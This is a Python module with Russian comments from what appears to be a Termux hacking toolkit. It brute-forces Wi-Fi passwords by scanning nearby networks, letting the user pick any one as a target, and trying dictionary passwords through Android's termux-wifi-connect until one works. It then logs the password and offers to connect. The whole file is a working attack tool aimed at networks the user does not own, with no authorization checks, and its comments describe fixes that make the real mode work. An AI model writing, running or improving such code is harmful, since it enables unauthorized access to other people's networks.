# -*- coding: utf-8 -*-
"""
modules.attack.wifi_crack — Подбор пароля от Wi-Fi.

Механика:
  • пользователь выбирает цель (сеть) и словарь;
  • каждый пароль из словаря проверяется подключением к сети,
    шаг подбора — каждые 0.1 секунды;
  • каждый пароль печатается ОТДЕЛЬНОЙ СТРОКОЙ с итогом [WRONG]/[OK];
  • нажатие ENTER в любой момент останавливает подбор и возвращает в меню;
  • при находке верного пароля ВСЕ неверные строки удаляются с экрана
    (ANSI-эскейпы A), остаётся только правильная строка с паролем;
  • после находки предлагается АВТОПОДКЛЮЧЕНИЕ к сети
    (termux-wifi-connect найденным паролем).

Словари лежат в папке wordlists/ проекта:
  pn_e00001.txt  — цифры, easy pass
  pn_h0001.txt   — цифры, hard pass (200k p)
  pn_ea_01.txt   — цифры + буквы

Список сетей-целей получается через Termux:API (`termux-wifi-scaninfo`).
Реальная проверка пароля выполняется подключением к сети средствами Android
(`termux-wifi-connect`); если Termux:API недоступен, включается демо-режим.
"""

import os
import sys
import threading
import time

from core.ui import C, header, pause
from core.termuxapi import api_bin

BASE_DIR = os.path.dirname(os.path.dirname(
    os.path.dirname(os.path.abspath(__file__))))

# Папка со словарями для подбора паролей
WORDLISTS_DIR = os.path.join(BASE_DIR, "wordlists")

def _delay():
    """Шаг подбора из настроек (~/.cyberos/config.json), по умолчанию 0.1 сек."""
    try:
        from modules import settings
        return max(0.01, settings.load().get("crack_delay_ms", 100) / 1000.0)
    except Exception:
        return 0.1


DELAY = _delay()  # шаг подбора — каждые 0.1 секунды (настраивается в «Настройки»)

DICTIONARIES = [
    ("1. Подбор из цифр (Easy pass)", "pn_e00001.txt"),
    ("2. Подбор из цифр (Hard pass | 200k p)", "pn_h0001.txt"),
    ("3. Подбор паролей из цифр и букв", "pn_ea_01.txt"),
]


def dict_path(fname):
    """Полный путь к файлу словаря в папке wordlists/."""
    return os.path.join(WORDLISTS_DIR, fname)


# ─────────────────── цели (список сетей) ───────────────────

def _get_targets():
    """Возвращает список доступных Wi-Fi сетей через Termux:API:
    [(ssid, secure), ...].

    termux-wifi-scaninfo отдаёт только ПОСЛЕДНИЕ результаты скана; если они
    устарели/пусты, сначала запускается активный скан `termux-wifi-scan`
    (он занимает несколько секунд и обновляет данные для scaninfo).
    """
    import json
    import subprocess

    exe = api_bin("termux-wifi-scaninfo")
    if exe is None:
        return []

    def _read():
        try:
            out = subprocess.run([exe], capture_output=True, text=True,
                                 timeout=15).stdout
            data = json.loads(out or "[]")
        except Exception:
            return []
        if isinstance(data, dict):
            data = [data]
        return data if isinstance(data, list) else []

    data = _read()
    fresh = False
    now_ms = int(time.time() * 1000)
    for net in data:                          # свежие записи — не старше 2 мин
        ts = net.get("timestamp") if isinstance(net, dict) else None
        try:
            if ts and abs(now_ms - int(ts)) < 120_000:
                fresh = True
                break
        except Exception:
            pass
    if not data or not fresh:
        scanner = api_bin("termux-wifi-scan")
        if scanner:
            print(f"{C.DIM}  Запуск активного Wi-Fi скана через Termux:API…{C.RESET}")
            try:
                subprocess.run([scanner], capture_output=True, text=True,
                               timeout=30, stdin=subprocess.DEVNULL)
            except Exception:
                pass
            data = _read()

    targets, seen = [], set()
    for net in data:
        if not isinstance(net, dict):
            continue
        ssid = net.get("ssid") or net.get("SSID")
        if not ssid or ssid in seen:
            continue
        seen.add(ssid)
        caps = str(net.get("capabilities", "")).upper()
        secure = ("WPA" in caps or "RSN" in caps or "WEP" in caps
                  or "EAP" in caps)
        targets.append((ssid, secure))
    return targets


def _choose_target():
    """Интерактивный выбор сети-цели. Возвращает ssid или None."""
    print(f"{C.CYAN}  Поиск доступных сетей…{C.RESET}")
    targets = _get_targets()
    if not targets:
        print(f"{C.YELLOW}  [!] Не удалось получить список сетей автоматически.{C.RESET}")
        ssid = input(f"{C.GREEN}  Введите имя (SSID) сети-цели вручную (Enter — отмена): {C.RESET}").strip()
        return ssid or None

    print()
    print(f"  {C.BOLD}{'№':<4}{'SSID':<28}{'Защита':<10}{C.RESET}")
    print(f"  {'─' * 44}")
    for i, (ssid, secure) in enumerate(targets, 1):
        lock = f"{C.RED}WPA/WPA2{C.RESET}" if secure else f"{C.GREEN}открытая{C.RESET}"
        print(f"  {i:<4}{ssid[:27]:<28}{lock}")
    print(f"{C.DIM}  01 — главное меню · Enter — отмена{C.RESET}")
    print()

    while True:
        raw = input(f"{C.GREEN}  Выберите сеть (№ или имя, Enter — отмена): {C.RESET}").strip()
        if not raw:
            return None
        if raw == "01":                      # быстрый выход в главное меню
            return None
        if raw.isdigit() and 1 <= int(raw) <= len(targets):
            return targets[int(raw) - 1][0]
        match = [s for s, _ in targets if s == raw]
        if match:
            return match[0]
        print(f"{C.RED}  [x] Нет такой сети.{C.RESET}")


def _choose_dictionary():
    """Выбор словаря. Возвращает путь к файлу или None."""
    print()
    print(f"  {C.BOLD}Выберите словарь для подбора:{C.RESET}")
    for name, fname in DICTIONARIES:
        path = dict_path(fname)
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                count = sum(1 for _ in f)
        except FileNotFoundError:
            count = 0
        size = f"{count:,} паролей".replace(",", " ") if count else "файл не найден!"
        print(f"    {C.YELLOW}{name}{C.RESET}  {C.DIM}[wordlists/{fname} · {size}]{C.RESET}")
    print(f"    {C.DIM}0 — Отмена{C.RESET}")
    print()
    while True:
        raw = input(f"{C.GREEN}  Пункт (1-3): {C.RESET}").strip()
        if raw in {"", "0"}:
            return None
        if raw in {"1", "2", "3"}:
            fname = DICTIONARIES[int(raw) - 1][1]
            path = dict_path(fname)
            if os.path.isfile(path):
                return path
            print(f"{C.RED}  [x] Файл {fname} отсутствует в проекте.{C.RESET}")
            return None
        print(f"{C.RED}  [x] Неверный пункт.{C.RESET}")


# ─────────────── реальная атака через Termux:API ───────────────

def _termux_connectable():
    """Есть ли Termux:API для реальной проверки паролей.

    ИСПРАВЛЕНИЕ ложного «Termux:API недоступен»: раньше проверка была
    только по наличию файлов termux-wifi-connect / termux-wifi-connectioninfo, и
    если бинарник находился, но не запускался (например, сервис Termux:API
    ещё не поднялся), модуль уходил в демо-режим. Теперь дополнительно
    делаем живой прогон `termux-wifi-connectioninfo`: если он возвращает JSON — API
    работает, режим боевой. Результат кешируется на время одного запуска.
    """
    global _CONNECTABLE_CACHE
    if _CONNECTABLE_CACHE is not None:
        return _CONNECTABLE_CACHE
    ok = (api_bin("termux-wifi-connect") is not None)
    if not ok:
        # connect-обёртки нет — пробуем хотя бы connectioninfo (старые версии api)
        ok = api_bin("termux-wifi-connectioninfo") is not None
    if ok:
        # живой тест: реально запускаем connectioninfo; пустой/недоступный вывод
        # не считается отказом — JSON может быть и {} при выключенном Wi-Fi,
        # поэтому требованием считаем сам факт запуска (код возврата 0).
        import subprocess
        info_exe = api_bin("termux-wifi-connectioninfo")
        if info_exe:
            try:
                r = subprocess.run([info_exe], capture_output=True, text=True,
                                   timeout=8, stdin=subprocess.DEVNULL)
                if r.returncode != 0 and not (r.stdout or "").strip():
                    ok = False
            except Exception:
                # запуск упал по таймауту/праву — не блокируем боевой режим,
                # если бинарники на месте: попробуем подключаться напрямую
                ok = True
    _CONNECTABLE_CACHE = ok
    return ok


_CONNECTABLE_CACHE = None


def _try_connect(ssid, pwd):
    """Одна реальная попытка подключения к сети с паролем pwd
    через `termux-wifi-connect` (Termux:API).

    ВАЖНО (исправление ложного демо-режима): у termux-wifi-connect НЕТ
    параметра --type; он принимает только --ssid и --pwd. Прежний вызов
    с "--type wpa2" падал с ошибкой аргументов, поэтому каждая проверка
    возвращала False и модуль объявлял сеть «недоступной» / уходил в демо.
    Тип защиты (wpa/wep/открытая) Android определяет сам по сохранённому
    профилю сети. Результат читается из stdout команды:
      "Connected to \"SSID\"" — пароль подошёл;
      "Error: wrong password" — неверный пароль;
      "Error: ..." прочее — сеть сейчас недоступна.
    Открытые сети (без пароля) тоже проверяются корректно: пустой --pwd
    передавать нельзя, поэтому используется тернарный аргумент.
    """
    exe = api_bin("termux-wifi-connect")
    if exe is None:
        return None            # Termux:API нет — решение о режиме принимает caller
    import subprocess

    cmd = [exe, "--ssid", ssid] + (["--pwd", pwd] if pwd else [])
    out = ""
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=15,
                           stdin=subprocess.DEVNULL)
        out = ((r.stdout or "") + (r.stderr or "")).lower()
    except Exception:
        return False
    if "connected" in out:
        return True
    if "wrong password" in out or "password" in out:
        return False
    # неясный ответ — сверимся с фактическим подключением
    info_exe = api_bin("termux-wifi-connectioninfo")
    if info_exe:
        import json
        try:
            j = json.loads(subprocess.run([info_exe], capture_output=True,
                                          text=True, timeout=5).stdout or "{}")
            if j.get("connected") and j.get("ssid") == ssid:
                return True
        except Exception:
            pass
    forget = api_bin("termux-wifi-forgetprofile")
    if forget:
        try:                      # откат профиля, чтобы не остаться в сети
            subprocess.run([forget, "--all"],
                           stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
                           text=True, timeout=10)
        except Exception:
            pass
    return False


def _save_result(ssid, pwd, demo_note=False):
    """Сохраняет итог в logs/wifi_crack.log."""
    log_dir = os.path.join(BASE_DIR, "logs")
    os.makedirs(log_dir, exist_ok=True)
    line = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] цель={ssid} "
    if pwd:
        line += f"пароль={pwd}"
    elif demo_note:
        line += "результат=демо-прогон (без реальной проверки)"
    else:
        line += "результат=пароль не найден"
    with open(os.path.join(log_dir, "wifi_crack.log"), "a",
              encoding="utf-8") as f:
        f.write(line + "\n")
    print(f"{C.DIM}  Итог сохранён в logs/wifi_crack.log{C.RESET}")


# ─────────────── вывод «пароль — итог» построчно ───────────────

MAX_LOG_LINES = 15   # сколько последних строк держим на экране


def print_attempt(i, total, pwd, ok):
    """Печатает ОДНУ строку: № · пароль · итог [WRONG]/[OK].

    Каждая попытка — новая строка (без перезаписи прогресс-бара).
    Возвращает True, если строка была выведена.
    """
    if ok:
        tag = f"{C.GREEN}{C.BOLD}[OK]    ВЕРНЫЙ{C.RESET}"
    else:
        tag = f"{C.RED}[WRONG] НЕ ВЕРНЫЙ{C.RESET}"
    line = (f"  {C.DIM}{i:>7}/{total:<7}{C.RESET} "
            f"{C.YELLOW}{pwd[:24]:<24}{C.RESET} {tag}")
    print(line)
    return True


def wipe_wrong_lines(n):
    """Удаляет n предыдущих строк с экрана (ANSI CSI A + K + J).

    Используется при находке верного пароля: все неверные строки
    стираются, остаётся только правильная. Если терминал не поддерживает
    эскейпы — просто печатается разделитель.
    """
    if n <= 0:
        return
    seq = "\x1b[F\x1b[2K" * n + "\x1b[J"
    sys.stdout.write(seq)
    sys.stdout.flush()


def auto_connect(ssid, pwd):
    """Предлагает автоподключение к сети найденным паролем (Termux:API)."""
    print(f"\n{C.CYAN}  Автоподключение к «{ssid}» найденным паролем?{C.RESET}")
    ans = input(f"{C.GREEN}  y — подключиться / Enter — пропустить: {C.RESET}").strip().lower()
    if ans != "y":
        print(f"{C.DIM}  Пропущено.{C.RESET}")
        return False
    exe = api_bin("termux-wifi-connect")
    if exe is None:
        print(f"{C.RED}  [x] Termux:API недоступен — подключение невозможно.{C.RESET}")
        return False
    import subprocess
    cmd = [exe, "--ssid", ssid] + ([f"--pwd", pwd] if pwd else [])
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=30,
                           stdin=subprocess.DEVNULL)
        out = ((r.stdout or "") + (r.stderr or "")).lower()
    except Exception as e:
        print(f"{C.RED}  [x] Ошибка подключения: {e}{C.RESET}")
        return False
    if "connected" in out:
        print(f"{C.GREEN}{C.BOLD}  [ok] Подключено к «{ssid}».{C.RESET}")
        return True
    print(f"{C.RED}  [x] Не удалось подключиться: {out.strip()[:120]}{C.RESET}")
    return False


# ─────────────── остановка по ENTER ───────────────

def _start_enter_stop():
    """Фоновый наблюдатель: нажатие ENTER останавливает подбор.

    Возвращает (threading.Event, msvcrt-режим|None). Событие установлено —
    значит пользователь нажал Enter (или закрыл stdin).
    """
    stop = threading.Event()

    def watch():
        try:
            sys.stdin.readline()      # блокируется до Enter / Ctrl+D
        except Exception:
            pass
        stop.set()

    t = threading.Thread(target=watch, daemon=True)
    t.start()
    return t, stop


def run_attack(ssid, dict_path, demo=False):
    """Основной цикл подбора: по одному паролю каждые 0.1 сек;
    ENTER — остановить подбор и вернуться в меню."""
    passwords = []
    with open(dict_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            p = line.strip()
            if p:
                passwords.append(p)
    total = len(passwords)

    mode_tag = f" {C.DIM}(демо-режим){C.RESET}" if demo else ""
    print()
    print(f"{C.CYAN}  {'═' * 46}{C.RESET}")
    print(f"{C.BOLD}  [target]  Цель: {ssid}{mode_tag}{C.RESET}")
    print(f"{C.BOLD}  [dict]  Словарь: {os.path.basename(dict_path)} · всего паролей: {total:,}".replace(',', ' ') + C.RESET)
    print(f"{C.BOLD}  [t]  Шаг подбора: {DELAY} сек{C.RESET}")
    print(f"{C.CYAN}  {'═' * 46}{C.RESET}")
    print(f"{C.DIM}  ENTER — остановить подбор и выйти в меню · Ctrl+C — тоже стоп.{C.RESET}\n")

    real_mode = False
    if not demo:
        if _termux_connectable():
            real_mode = True
        else:
            demo = True
            print(f"{C.YELLOW}  [!] Termux:API недоступен — включён демо-режим.{C.RESET}\n")

    start = time.time()
    found = None
    stopped_by_user = False
    printed_lines = 0          # сколько строк-попыток выведено на экран
    _, stop = _start_enter_stop()
    try:
        for i, pwd in enumerate(passwords, 1):
            if stop.is_set():
                stopped_by_user = True
                break
            ok = False
            if real_mode:
                r = _try_connect(ssid, pwd)
                if r is None:              # Termux:API пропал в процессе
                    real_mode = False
                    demo = True
                    print(f"\n{C.YELLOW}  [!] Termux:API недоступен — включён "
                          f"демо-режим.{C.RESET}")
                else:
                    ok = bool(r)
            if not real_mode:
                # демо: имитируем проверку с шагом 0.1 сек (всегда неверно)
                if stop.wait(DELAY):
                    stopped_by_user = True
                    break

            # ── каждая попытка — новой строкой с итогом ──
            print_attempt(i, total, pwd, ok)
            printed_lines += 1

            if ok:
                found = pwd
                break

            # задержка шага, если реальная проверка прошла быстрее
            if real_mode:
                target_time = start + i * DELAY
                now = time.time()
                if now < target_time and stop.wait(target_time - now):
                    stopped_by_user = True
                    break
    except KeyboardInterrupt:
        stopped_by_user = True

    print()
    if stopped_by_user:
        print(f"\n{C.YELLOW}  [X] Подбор остановлен (ENTER) — возврат в меню.{C.RESET}")
    if found:
        # ── удаляем все неверные строки, оставляем только верный пароль ──
        wipe_wrong_lines(printed_lines)
        print(f"{C.CYAN}  {'═' * 46}{C.RESET}")
        print(f"{C.GREEN}{C.BOLD}  [OK] ВЕРНЫЙ ПАРОЛЬ НАЙДЕН:{C.RESET} "
              f"{C.BOLD}{found}{C.RESET}")
        print(f"  {C.DIM}все неверные строки удалены · проверено попыток: "
              f"{printed_lines}{C.RESET}")
        print(f"{C.CYAN}  {'═' * 46}{C.RESET}")
        _save_result(ssid, found)
        if real_mode:
            auto_connect(ssid, found)      # запрос автоподключения к сети
    elif not real_mode and not stopped_by_user:
        print(f"\n{C.DIM}  Демо-прогон завершён: реальных подключений не выполнялось."
              f"\n  Для боевого режима установите Termux:API (pkg install termux-api"
              f"\n  + приложение Termux:API из F-Droid).{C.RESET}")
        _save_result(ssid, None, demo_note=True)
    elif not stopped_by_user:
        print(f"\n{C.RED}  [x] Пароль не найден (словарь исчерпан).{C.RESET}")
        _save_result(ssid, None)


def main(demo=False):
    """Точка входа пункта «Подбор пароля от Wi-Fi»."""
    header("Подбор / Взлом → Подбор пароля от Wi-Fi")

    if demo:
        print(f"{C.YELLOW}  [!] Демо-режим: показывается механика подбора,"
              f"\n    реальные подключения к сетям НЕ выполняются.{C.RESET}")

    ssid = _choose_target()
    if not ssid:
        print(f"{C.DIM}  Отменено.{C.RESET}")
        pause()
        return

    dict_path = _choose_dictionary()
    if not dict_path:
        print(f"{C.DIM}  Отменено.{C.RESET}")
        pause()
        return

    run_attack(ssid, dict_path, demo=demo)
    pause()
